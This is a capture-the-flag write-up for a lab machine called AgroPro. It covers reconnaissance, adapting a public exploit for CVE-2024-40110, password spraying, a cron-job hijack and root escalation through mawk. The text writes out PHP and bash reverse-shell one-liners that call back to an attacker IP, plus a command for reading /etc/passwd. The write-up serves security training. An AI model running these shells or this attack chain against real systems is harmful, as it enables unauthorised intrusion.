# Official Write-Up 5M1TH - AgroPro by 5M1TH.

## Let’s enjoy the green fields and relax, enjoying nature. Exploit CVE-2024–40110

[1](./img/01.png)

#

# Let’s go!!!

## Task 1 - Enumeration and Initial Access

![RCE](./img/02.png)

#

# RECONAISSANCE AND ENUMERATION

## Nmap simple scan detect 3 opened ports:

![RCE](./img/03.png)

## Nmap services and versions scan:

![RCE](./img/04.png)

## Nmap vulnerabilities scan:

![RCE](./img/05.png)

![RCE](./img/06.png)

![RCE](./img/07.png)

## Web recon and enumeration by softwares and tecnology:

![RCE](./img/08.png)

![RCE](./img/09.png)

## Access the URL indicate http://10.10.170.103/

![RCE](./img/10.png)

## Identified the support user e-mail as support@agropro.local

![RCE](./img/11.png)

## Bruteforce files and direcitories, identified the “/ranch” directory:

![RCE](./img/12.png)

## New web enumeration on directory discovered indicate the Titlle “RedCock Farm”:

![RCE](./img/13.png)

## Access the new URL indicate http://10.10.170.103/ranch/

![RCE](./img/14.png)

## New files and directories bruteforce

![RCE](./img/15.png)

# Theat modeling

## Search for exploits:

![RCE](./img/16.png)

https://www.exploit-db.com/exploits/52053

## Exploit download:

![RCE](./img/17.png)

## Necessary adjustment:

![RCE](./img/18.png)

![RCE](./img/19.png)

## After adjustment:

![RCE](./img/20.png)

![RCE](./img/21.png)

## Executing the exploit - fail:

![RCE](./img/22.png)

## Search for other exploit:

![RCE](./img/23.png)

https://github.com/thiagosmith/CVE-2024-40110

## Raw code

https://raw.githubusercontent.com/thiagosmith/CVE-2024-40110/refs/heads/main/exploit.py

![RCE](./img/24.png)

## Download new exploit:

![RCE](./img/25.png)

## Necessary new adjustment:

![RCE](./img/26.png)

![RCE](./img/27.png)

## After new adjustment:

![RCE](./img/28.png)

![RCE](./img/29.png)

## Executing the exploit - bingo!!!

![RCE](./img/30.png)

## Creating a payload of reverse Shell to the target:

https://www.revshells.com/

![RCE](./img/31.png)

PHP Choise because the application is PHP!!!

```
php -r '$sock=fsockopen("10.17.51.216",9001);exec("sh <&3 >&3 2>&3");'
```

## Listener:

![RCE](./img/32.png)

## Executing the revserse shell command on pseudo-shell by exploit:

![RCE](./img/33.png)

## Receiver the reverse shell:

![RCE](./img/34.png)

## Shell improvement:

![RCE](./img/35.png)

## Internal enumeration:

![RCE](./img/36.png)

Discovered the “includes/dbconnection.php”

## Read file:

![RCE](./img/37.png)

```
db: 
user: 
pass: 
```

## Reading the /etc/passwd file finding users in the host:

![RCE](./img/38.png)

```
cat /etc/passwd | cut -d ":" -f 1
```
## Users wordlist creation on my attack machine:

![RCE](./img/39.png)

## Password spray with hydra on ssh service:

![RCE](./img/40.png)

```
ssh 
host: 10.10.170.103   
login: 
password: 
```

## Initial acess from ssh user and pass. The first flag!!!

![RCE](./img/41.png)

# Task 2 - Lateral movement and horizontal privilege escalation.

## Locate linpeas.sh

![RCE](./img/42.png)

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

![RCE](./img/43.png)

## Download linpeas.sh

![RCE](./img/44.png)

## Listener with web server in python:

![RCE](./img/45.png)

## Request from target:

![RCE](./img/46.png)

## Assigning execution rights to the binary file and execution:

![RCE](./img/47.png)

# Important reports

## Kernel exploits less - probable:

![RCE](./img/48.png)

## Crontab:

![RCE](./img/49.png)

## Writable files:

![RCE](./img/50.png)

## Backup Folders:

![RCE](./img/51.png)

## Analyzing reported script:

![RCE](./img/52.png)

![RCE](./img/52.png)

![RCE](./img/54.png)

![RCE](./img/55.png)

## Searching for a new reverse shell:

![RCE](./img/56.png)

Bash to differentiate a little

```
sh -i >& /dev/tcp/10.17.51.216/9001 0>&1
```

## Inserting my reverse shell into the script:

![RCE](./img/57.png)

## Opening the listner and wait the cron job:

![RCE](./img/58.png)

## Receive the reverse shell and taking the second user flag:

![RCE](./img/59.png)

Houston, have a Shell!!

# Task 3- Vertical Privilege Escalation

## Improving the shell:

![RCE](./img/60.png)

## Checking permissions:

![RCE](./img/61.png)

## Searching about “mawk” on GTFOBINS:

https://gtfobins.github.io/gtfobins/mawk

![RCE](./img/62.png)

## Escalating privilege vertically and getting the final root flag:

![RCE](./img/63.png)

# Final words:
The intention behind creating this room arose when, at a certain moment, I was researching exploits for vulnerable applications on the exploit-db.com website.

I found the exploit for the application I was testing in a fully controlled environment. However, when executing it, I received the error message described in this Write-Up.

Faced with adversity, I managed to fix the exploit and enhance it to meet my specific needs at that moment.

I built the machine and the room with the aim of helping enthusiasts understand that we need to adapt to applications and that not every exploit we find will work successfully on the first attempt.

Persistence is the key word in this challenge, proposed for those who decide to accept it.

“The true achievement is not just in finding a functional exploit, but in refining challenges, adapting strategies, and never giving up in the face of adversity. Persistence turns obstacles into learning and evolution!”

# About the author:

## https://www.linkedin.com/in/smith-braz-938825209/

![RCE](./img/64.png)

## https://tryhackme.com/p/5m1th

![RCE](./img/65.png)

Send me feedback, please…




